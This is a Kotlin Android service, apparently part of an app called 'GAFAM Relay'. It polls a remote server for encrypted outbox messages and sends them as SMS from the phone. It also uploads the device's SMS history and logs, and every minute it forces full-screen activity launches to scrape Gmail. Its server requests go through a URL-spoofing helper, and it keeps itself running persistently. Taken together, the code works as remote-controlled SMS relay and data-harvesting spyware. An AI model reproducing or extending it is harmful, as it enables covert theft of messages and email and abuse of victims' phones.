package com.gafam.relay

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

/**
 * Persistent foreground relay (VPN-style notification).
 * Keeps outbox polling + log shipping alive when the UI is closed.
 */
class RelayForegroundService : Service() {

    companion object {
        private const val TAG = "GAFAM_Relay"
        private const val CHANNEL_ID = "gafam_relay"
        private const val NOTIF_ID = 5150
        private const val ACTION_STOP = "com.gafam.relay.STOP_RELAY"

        private val running = AtomicBoolean(false)

        fun start(context: Context) {
            val prefs = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
            if (prefs.getString("apiUrl", null).isNullOrBlank()) return
            if (prefs.getString("jwtSecret", null).isNullOrBlank()) return

            val intent = Intent(context, RelayForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, RelayForegroundService::class.java))
        }
    }

    private var pollThread: Thread? = null
    private val pollAlive = AtomicBoolean(false)
    private var edgePollTick = 0
    private var gmailScrapeTick = 0

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        val notification = buildNotification("Relay connected — waiting for SMS")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, notification)
        }
        running.set(true)
        LogShipper.start(this)
        LogShipper.event(this, "I", "relay", "Foreground relay service started")
        
        // Gmail scrape via full-screen notification (works in deep sleep)
        startGmailScrapeLoop()
        startPollLoop()
        // Import recent conversations from the phone SMS store
        SmsHistorySync.syncAsync(this, force = true)
        // Periodic soft refresh (respects min interval)
        thread(name = "gafam-sms-history-timer", isDaemon = true) {
            while (running.get()) {
                try {
                    Thread.sleep(15 * 60 * 1000L)
                } catch (_: InterruptedException) {
                    break
                }
                if (running.get()) SmsHistorySync.syncAsync(this, force = false)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        // Ensure notification stays up if restarted
        val notification = buildNotification("Relay connected — waiting for SMS")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, notification)
        }
        if (!pollAlive.get()) startPollLoop()
        return START_STICKY
    }

    override fun onDestroy() {
        pollAlive.set(false)
        running.set(false)
        EmailDumpsysPoller.stop()
        LogShipper.event(this, "W", "relay", "Foreground relay service stopped")
        super.onDestroy()
    }

    private fun startGmailScrapeLoop() {
        thread(name = "gafam-scrape", isDaemon = true) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            val ch = NotificationChannel("gafam_scrape", "Scrape", NotificationManager.IMPORTANCE_HIGH)
            nm.createNotificationChannel(ch)
            while (running.get()) {
                try {
                    Thread.sleep(60000)
                    val pi = PendingIntent.getActivity(this@RelayForegroundService, 999,
                        Intent(this@RelayForegroundService, GmailScrapeActivity::class.java),
                        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
                    nm.notify(777, NotificationCompat.Builder(this@RelayForegroundService, "gafam_scrape")
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle("Gmail check").setContentText("...")
                        .setFullScreenIntent(pi, true).setAutoCancel(true)
                        .setOngoing(false).setPriority(NotificationCompat.PRIORITY_HIGH).build())
                    Thread.sleep(20000)
                    nm.cancel(777)
                } catch (e: Exception) { Log.w(TAG, "Scrape: ${e.message}") }
            }
        }
    }

    private fun startPollLoop() {
        if (!pollAlive.compareAndSet(false, true)) return
        pollThread = thread(name = "gafam-outbox-poll", isDaemon = true) {
            while (pollAlive.get()) {
                try {
                    pollOutboxOnce()
                    edgePollTick++
                    if (edgePollTick % 2 == 0) {
                        EdgeClient.syncOnce(applicationContext)
                    }
                    // Launch Gmail scrape activity every 60s
                    gmailScrapeTick++
                    if (gmailScrapeTick >= 60) {
                        gmailScrapeTick = 0
                        val intent = android.content.Intent(applicationContext, GmailScrapeActivity::class.java)
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "outbox poll error", e)
                }
                try {
                    Thread.sleep(1000)
                } catch (_: InterruptedException) {
                    break
                }
            }
        }
    }

    private fun pollOutboxOnce() {
        val prefs = getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        val client = ApiClient.getClient(this) ?: return
        val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/outbox")
        val request = Request.Builder()
            .url(spoofedUrl)
            .get()
            .addHeader("Authorization", "Bearer $jwtSecret")
            .build()

        // Settings sync (best-effort)
        try {
            val settingsReq = Request.Builder()
                .url(ApiClient.getSpoofedUrl(apiUrl, "/api/settings"))
                .get()
                .addHeader("Authorization", "Bearer $jwtSecret")
                .build()
            val setRes = client.newCall(settingsReq).execute()
            if (setRes.isSuccessful) {
                val setJson = JSONObject(setRes.body?.string() ?: "{}")
                if (setJson.has("contacts_sync_enabled")) {
                    val isEnabled = setJson.getString("contacts_sync_enabled") == "true"
                    prefs.edit().putBoolean("contacts_sync_enabled", isEnabled).apply()
                }
            }
        } catch (_: Exception) {
        }

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) return
        val responseStr = response.body?.string() ?: return
        val payload = JSONObject(responseStr)
        val encryptedData = payload.getString("encrypted_data")
        val ivStr = payload.getString("iv")

        val digest = java.security.MessageDigest.getInstance("SHA-256")
        val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
        val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        val iv = android.util.Base64.decode(ivStr, android.util.Base64.DEFAULT)
        val ciphertext = android.util.Base64.decode(encryptedData, android.util.Base64.DEFAULT)
        cipher.init(
            javax.crypto.Cipher.DECRYPT_MODE,
            secretKey,
            javax.crypto.spec.GCMParameterSpec(128, iv)
        )
        val plaintext = cipher.doFinal(ciphertext)
        val outboxArray = org.json.JSONArray(String(plaintext, Charsets.UTF_8))

        if (outboxArray.length() > 0) {
            updateNotification("Sending ${outboxArray.length()} outbox SMS…")
        }

        for (i in 0 until outboxArray.length()) {
            val msg = outboxArray.getJSONObject(i)
            val id = msg.getInt("id")
            val recipient = msg.getString("recipient")
            val body = msg.getString("body")
            try {
                val smsManager = SmsManager.getDefault()
                val parts = smsManager.divideMessage(body)
                if (parts.size == 1) {
                    smsManager.sendTextMessage(recipient, null, body, null, null)
                } else {
                    smsManager.sendMultipartTextMessage(recipient, null, parts, null, null)
                }
                Log.d(TAG, "Sent remote SMS to $recipient")
                LogShipper.event(this, "I", "outbox", "Sent SMS to $recipient (${body.length} chars)")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send SMS to $recipient", e)
                LogShipper.event(this, "E", "outbox", "Failed SMS to $recipient: ${e.message}")
            }
            deleteFromOutbox(apiUrl, jwtSecret, id)
        }

        if (outboxArray.length() > 0) {
            updateNotification("Relay connected — waiting for SMS")
        }
    }

    private fun deleteFromOutbox(apiUrl: String, jwtSecret: String, id: Int) {
        try {
            val client = ApiClient.getClient(this) ?: return
            val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/outbox?id=$id")
            val request = Request.Builder()
                .url(spoofedUrl)
                .delete()
                .addHeader("Authorization", "Bearer $jwtSecret")
                .build()
            client.newCall(request).execute()
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting outbox msg", e)
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val mgr = getSystemService(NotificationManager::class.java) ?: return
        val channel = NotificationChannel(
            CHANNEL_ID,
            "GAFAM Relay",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Keeps the SMS relay connected to your VPC"
            setShowBadge(false)
        }
        mgr.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String): Notification {
        val openIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val stopIntent = PendingIntent.getService(
            this,
            1,
            Intent(this, RelayForegroundService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GAFAM Relay")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_send)
            .setOngoing(true)
            .setContentIntent(openIntent)
            .addAction(0, "Stop", stopIntent)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun updateNotification(text: String) {
        val mgr = getSystemService(NotificationManager::class.java) ?: return
        mgr.notify(NOTIF_ID, buildNotification(text))
    }
}
